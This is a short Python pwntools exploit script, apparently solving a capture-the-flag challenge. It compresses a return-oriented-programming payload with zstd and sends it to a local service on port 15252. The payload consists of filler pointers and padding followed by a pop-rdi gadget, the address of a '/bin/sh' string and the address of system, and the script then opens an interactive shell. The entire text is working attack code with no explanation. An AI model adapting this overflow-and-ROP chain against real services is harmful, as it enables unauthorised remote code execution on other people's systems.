import zstandard as zstd
import struct
from pwn import *
import socket
import sys
import threading
import requests

system = 0x401130
sh = 0x402017
pop_rdi_rbp = 0x401567

def compress(data):
    # very simple vuln 
    cctx = zstd.ZstdCompressor(level=3, write_content_size=False)    
    compressed = cctx.compress(data)
    return compressed

pl = p64(0x404000) * 16 + b'B' * 8 + p64(pop_rdi_rbp) + p64(sh) + p64(0) + p64(system)
data = compress(pl)
#p = process('./chall')
p = remote('localhost', 15252)
pause()
p.send(data)
p.interactive()
